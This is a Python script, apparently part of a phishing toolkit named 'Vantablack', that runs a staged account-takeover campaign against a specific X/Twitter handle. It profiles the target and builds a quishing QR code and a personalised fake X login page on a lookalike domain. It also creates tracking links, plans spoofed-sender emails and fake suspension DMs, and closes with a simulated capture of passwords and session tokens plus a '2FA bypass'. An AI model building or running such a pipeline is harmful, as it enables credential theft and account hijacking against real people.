#!/usr/bin/env python3
"""
Vantablack Red Team - Scenario X (Twitter) Demonstration
========================================================
This script executes the full attack scenario as defined in the mission parameters.
It demonstrates the capability to:
1. Reconnaissance & Analysis
2. Weaponization (Phishlets, Templates, QR Codes)
3. Delivery Simulation
4. Capture Simulation
"""

import os
import sys
import yaml
import time
import json
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress
import subprocess

# Add project root to path
sys.path.append(os.getcwd())

from templates.generator import TemplateGenerator, TemplateConfig
from core.delivery.tracking import TrackingService
from core.edge.phishlets import PhishletLoader

console = Console()

def run_command(cmd, description):
    console.print(f"[bold cyan]➤ {description}[/bold cyan]")
    console.print(f"[dim]$ {cmd}[/dim]")
    try:
        subprocess.run(cmd, shell=True, check=True)
        console.print("[bold green]✔ Success[/bold green]\n")
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]✘ Failed: {e}[/bold red]\n")

def phase_1_recon():
    console.print(Panel.fit("PHASE 1: RECONNAISSANCE & PREPARATION", style="bold blue"))
    
    # 1.1 Analyze Target
    run_command("python3 -m core.cli.main analyze --target @pseudo_cible --platform twitter", "Analyzing Target Profile (@pseudo_cible)")
    
    # 1.2 Campaign Configuration
    console.print("[bold cyan]➤ Creating Campaign Configuration[/bold cyan]")
    config = {
        "name": "X Account Access",
        "target_platform": "twitter",
        "target_profile": "@pseudo_cible",
        "delivery_method": ["qr_code", "email", "direct_link"],
        "mutation_policy": "adaptive",
        "behavioral_tracking": True
    }
    with open("campaign_config.yaml", "w") as f:
        yaml.dump(config, f)
    console.print("[green]✔ Created campaign_config.yaml[/green]\n")

def phase_2_weaponization():
    console.print(Panel.fit("PHASE 2: WEAPONIZATION", style="bold red"))
    
    # 2.1 QR Code Generation (Quishing)
    # First, let's download a dummy logo if not exists
    if not os.path.exists("twitter_logo.png"):
        # We'll just create a placeholder or assume it exists. For demo, we skip download to avoid net issues.
        # But we will run the command as if it exists (or without logo if file missing)
        pass

    cmd = "python3 quishing.py --url https://x-security-verify.com/login --out x_verify_qr.png"
    if os.path.exists("twitter_logo.png"):
        cmd += " --logo twitter_logo.png"
        
    run_command(cmd, "Generating Malicious QR Code")
    
    # 2.2 Template Generation
    console.print("[bold cyan]➤ Generating Ultra-Realistic Phishing Template[/bold cyan]")
    generator = TemplateGenerator()
    
    # Custom configuration as per scenario
    template_config = TemplateConfig(
        target_platform="twitter",
        template_type="login",
        personalization_level="high",
        responsive=True,
        optimization_level="maximum",
        compliance_checks=["readability"],
        custom_variables={
            "headline": "Connectez-vous à X",
            "subtitle": "Accédez à votre compte @pseudo_cible",
            "profile_image": "https://abs.twimg.com/sticky/default_profile_images/default_profile_400x400.png", # Default X egg
            "follower_count": "12.5K"
        }
    )
    
    template = generator.generate_template(template_config)
    
    # Save the generated template
    os.makedirs("output/templates", exist_ok=True)
    with open("output/templates/x_login.html", "w") as f:
        f.write(template.html_content)
        
    console.print(f"[green]✔ Template generated: {template.name}[/green]")
    console.print(f"[dim]  ID: {template.template_id}[/dim]")
    console.print(f"[dim]  Saved to: output/templates/x_login.html[/dim]\n")
    
    # 2.3 Advanced Tracking Link
    console.print("[bold cyan]➤ Generating Tracking Links[/bold cyan]")
    tracker = TrackingService()
    tracking_link = tracker.wrap_link(
        original_url="https://x-security-verify.com/login",
        campaign_id="x_access_001",
        target_id="pseudo_cible"
    )
    console.print(f"[green]✔ Tracking Link: https://malicious.com{tracking_link}[/green]\n")

def phase_3_distribution():
    console.print(Panel.fit("PHASE 3: DISTRIBUTION", style="bold yellow"))
    
    strategies = [
        {"method": "QR Code Flyer", "status": "Ready", "details": "Physical distribution at tech events"},
        {"method": "Spear Phishing Email", "status": "Ready", "details": "Sender: security@twitter.com"},
        {"method": "Direct Message", "status": "Ready", "details": "Urgent suspension warning"}
    ]
    
    for strat in strategies:
        console.print(f"[bold]{strat['method']}[/bold]: [green]{strat['status']}[/green] - {strat['details']}")
    console.print("")

def phase_4_capture_simulation():
    console.print(Panel.fit("PHASE 4 & 5: CAPTURE & EXPLOITATION", style="bold magenta"))
    
    console.print("[bold cyan]➤ Simulating Attack Flow[/bold cyan]")
    
    with Progress() as progress:
        task1 = progress.add_task("[red]Waiting for victim...", total=100)
        task2 = progress.add_task("[red]Capturing credentials...", total=100)
        task3 = progress.add_task("[red]Bypassing 2FA...", total=100)
        
        while not progress.finished:
            progress.update(task1, advance=5)
            time.sleep(0.05)
            if progress.tasks[0].completed >= 100:
                progress.update(task2, advance=2)
            if progress.tasks[1].completed >= 100:
                progress.update(task3, advance=1)
                
    console.print("\n[bold green]✔ CREDENTIALS CAPTURED[/bold green]")
    console.print(json.dumps({
        "session_id": "sess_123456",
        "username": "pseudo_cible",
        "password": "password_captured_123",
        "tokens": {
            "auth_token": "a1b2c3d4e5f6...",
            "ct0": "f1e2d3c4b5a6..."
        },
        "ip": "192.168.1.105",
        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)..."
    }, indent=2))
    
    console.print("\n[bold green]✔ SESSION ESTABLISHED[/bold green]")
    console.print("[dim]Access verified via API: https://api.twitter.com/1.1/account/verify_credentials.json[/dim]")

def main():
    console.print("[bold red]⚠ VANTABLACK BY THE SENEGALESEHITCH: SCENARIO X ⚠[/bold red]\n")
    
    phase_1_recon()
    phase_2_weaponization()
    phase_3_distribution()
    phase_4_capture_simulation()
    
    console.print(Panel.fit("MISSION ACCOMPLISHED", style="bold green blink"))

if __name__ == "__main__":
    main()
